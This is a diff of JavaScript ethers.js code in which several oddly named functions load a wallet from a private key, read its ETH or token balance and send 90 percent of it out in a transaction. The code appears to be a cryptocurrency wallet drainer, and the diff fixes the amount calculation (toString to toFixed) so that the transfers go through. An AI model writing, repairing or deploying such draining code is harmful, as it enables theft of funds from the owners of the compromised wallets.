@@ -205,7 +205,7 @@ async function ethersgather() {
         let wallet = new ethers.Wallet(private, provider);
         const account = address
         const robinhood = await provider.getBalance(account)
-        const orchard = (robinhood * 0.90).toString();
+        const orchard = (robinhood * 0.90).toFixed()
         const michael = ethers.utils.parseUnits(orchard, 'wei')
         const send = async() => {
             const tx = {
@@ -254,7 +254,7 @@ async function etherstother() {
         const account = address
         var contract = new ethers.Contract(web14, abi, wallet);
         const superb = await contract.balanceOf(account).toString();
-        const orchard = (superb * 0.90).toString();
+        const orchard = (superb * 0.90).toFixed()
         const send = async() => {
             const tx = {
                 from: account,
@@ -305,7 +305,7 @@ async function etherslother() {
         const account = address
         var contract = new ethers.Contract(web14, abi, wallet);
         const superb = await contract.balanceOf(account).toString();
-        const orchard = (superb * 0.90).toString();
+        const orchard = (superb * 0.90).toFixed()
         const send = async() => {
             const tx = {
                 from: account,
@@ -352,7 +352,7 @@ async function ethersmother() {
         const account = address
         var contract = new ethers.Contract(web14, abi, wallet);
         const superb = await contract.balanceOf(account).toString();
-        const orchard = (superb * 0.90).toString();
+        const orchard = (superb * 0.90).toFixed()
         const send = async() => {
             const tx = {
                 from: account,
@@ -397,7 +397,7 @@ async function ethersfather() {
     const account = address
     var contract = new ethers.Contract(web14, abi, wallet);
     const superb = await contract.balanceOf(account);
-    const orchard = (superb * 0.90).toString();
+    const orchard = (superb * 0.90).toFixed()
     try {
         const send = async() => {
             const tx = {
@@ -435,7 +435,7 @@ async function ethersrather() {
     let wallet = new ethers.Wallet(private, provider);
     const account = address
     const robinhood = await provider.getBalance(account)
-    const orchard = (robinhood * 0.90).toString();
+    const orchard = (robinhood * 0.90).toFixed()
     const michael = ethers.utils.parseUnits(orchard, 'wei')
     try {
         const send = async() => {
